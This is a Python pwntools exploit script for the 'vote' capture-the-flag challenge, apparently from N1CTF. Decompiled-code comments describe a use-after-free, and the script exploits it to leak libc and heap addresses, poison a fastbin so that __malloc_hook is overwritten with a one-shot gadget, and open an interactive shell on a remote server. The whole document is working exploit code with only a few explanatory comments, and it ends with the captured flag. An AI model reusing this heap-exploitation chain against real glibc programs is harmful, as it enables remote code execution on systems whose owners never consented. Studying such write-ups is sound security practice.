# void cancel()
#{
#  if ( index >= 0 && index <= 15 && array[index] )
#  {
#    if ( --qword_602180[index] == --*(_QWORD *)array[index] )
#    {
#      // 0x602180 is an array whose values get incremented when 
#      // a certain candidate is voted. However, if we don't vote
#      // a candidate, the value remains zero and both checks above and below
#      // are true, which in consequence trigger a UAF.
#      if ( qword_602180[index] < 0 )
#        free(array[index]); <-- UAF -- doesn't null terminate the array entry
#    }
#    else if ( qword_602180[index] < 0 )
#    {
#      printf("%s", (char *)array[candidate] + 16);
#      fflush(stdout);
#      sub_400C00(" has freed");
#      free(array[index]);
#      array[index] = 0LL;
#    }
#  }
#}

from pwn import *

def create(size, name):
	r.sendlineafter('Action: ', '0')
	r.sendlineafter('size: ', str(size))

	if len(name) < size: 
		name += '\n'
	r.sendafter('name: ', name)
	return

def show(ru, idx):
	r.sendlineafter('Action: ', '1')
	r.sendlineafter('index: ', str(idx))
	r.recvuntil(ru)
	return int(r.recvline().strip())

def vote(idx):
	r.sendlineafter('Action: ', '2')
	r.sendlineafter('index: ', str(idx))
	return

def cancel(idx):
	r.sendlineafter('Action: ', '4')
	r.sendlineafter('index: ', str(idx))
	return

def pwn():

	create(0x80, 'kek')
	create(0x80, 'kek')

	# Trigger UAF
	cancel(0)

	libc  = show('time: ', 0) - 0x3c4b78
	mhook = libc + 0x3c4b10
	magic = libc + 0xf1147
	log.success('Libc: 0x{:x}'.format(libc))

	cancel(1)

	create(0x50, 'kek')
	create(0x50, 'kek')
	# Will be used after the heap leak in order to consolidate
	# all free'd chunks including fast chunks in order to start fresh.
	create(0x80, 'kek')

	cancel(2)
	cancel(3)

	heap = show('count: ', 3)
	log.success('Heap: 0x{:x}'.format(heap))

	# Consolidate heap
	cancel(4)

	# We will trigger a fastbin UAF and then use the vote functionality
	# in order to increment the FD pointer and point it to a fake fast chunk
	# of ours whose FD will contain a legit area close to __malloc_hook.
	create(0x58, 'A'*8) # 5
	create(0x58, p64(0) + p64(0x71) + p64(mhook-0x30+0xd) + p64(0)) # 6
	create(0x58, 'C'*8)

	cancel(6)
	cancel(5)

	# Increment chunk_5's FD to point to the fake fastbin chunk
	# we set up inside chunk_6.
	for i in xrange(0x20):
		vote(5)

	# (0x70) fastbin[5]: 0x603000 --> 0x603090 --> 0x7ffff7bb4aed
	create(0x58, 'kek')
	create(0x58, 'kek')
	create(0x58, 'A'*3 + p64(magic))

	# Trigger __malloc_hook => one shot gadget
	r.sendlineafter('Action: ', '0')
	r.sendlineafter('size: ', str(20))
	
	# N1CTF{Pr1nTf_2333333333!}
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('47.90.103.10', 6000)
        pwn()
    else:
        r = process('./vote')
        pause()
        pwn()
